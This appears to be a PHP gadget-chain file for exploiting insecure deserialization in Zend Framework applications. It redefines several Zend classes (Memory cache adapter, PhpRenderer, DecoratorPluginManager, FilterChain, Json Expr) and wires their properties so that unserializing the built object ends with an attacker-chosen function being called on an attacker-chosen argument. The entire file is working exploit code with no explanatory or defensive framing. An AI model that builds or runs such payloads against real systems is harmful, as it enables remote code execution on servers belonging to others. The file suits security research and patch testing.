<?php
namespace Zend\Cache\Storage\Adapter
{
    class Memory
    {
        protected $eventHandles;
        protected $events;

        function __construct($function, $param)
        {
            $this->eventHandles = [1];
            $this->events = new \Zend\View\Renderer\PhpRenderer($function, $param);
        }
    }
}

namespace Zend\View\Renderer
{
    class PhpRenderer
    {
        private $__helpers;

        function __construct($function, $param)
        {
            $this->__helpers = new \Zend\Tag\Cloud\DecoratorPluginManager($function, $param);
        }
    }
}

namespace Zend\Tag\Cloud
{
    class DecoratorPluginManager
    {
        protected $canonicalNames;
        protected $invokableClasses;
        protected $retrieveFromPeeringManagerFirst;
        protected $initializers;

        function __construct($function, $param)
        {
            $this->canonicalNames = array("detach"=>"cname","cname"=>"any");
            $this->invokableClasses = array("cname"=>"Zend\Tag\Cloud\DecoratorPluginManager");//satisfying the class_exists
            $this->retrieveFromPeeringManagerFirst = false;
            $this->initializers = [new \Zend\Filter\FilterChain($function, $param)];
        }
    }
}

namespace Zend\Filter
{
    class FilterChain
    {
        protected $filters;

        function __construct($function, $param)
        {
            $this->filters = new \SplFixedArray(2);
            $this->filters[0] = array(
                new \Zend\Json\Expr($param),
                "__toString"
            );
            $this->filters[1] = $function;
        }
    }
}

namespace Zend\Json
{
    class Expr
    {
        protected $expression;

        function __construct($param)
        {
            $this->expression = $param;
        }
    }
}
